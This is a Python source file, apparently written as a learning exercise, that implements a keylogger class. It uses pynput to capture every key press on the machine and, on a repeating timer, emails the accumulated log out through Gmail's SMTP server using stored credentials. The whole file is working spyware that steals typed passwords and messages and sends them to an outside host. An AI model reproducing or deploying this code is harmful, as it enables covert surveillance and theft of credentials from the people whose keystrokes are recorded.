#!/usr/bin/env python
import pynput.keyboard, threading, smtplib, re

# Everything is covered in the documentation!!
# https://pypi.org/project/pynput/

# YOU HAVE TO ADD SELF. BEFORE METHODS

class Keylogger:
    # Default constructor method
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started!"
        self.interval = time_interval
        self.email = email
        self.password = password


    def append_to_log(self, string):
        self.log = self.log + string

    # All the log editing is to make it look readable.
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = " "# Refresh your log after every mail
        timer = threading.Timer(self.interval, self.report) # Create a timer thread, every 5 seconds, run the function.
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # Google's server runs on port 587
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()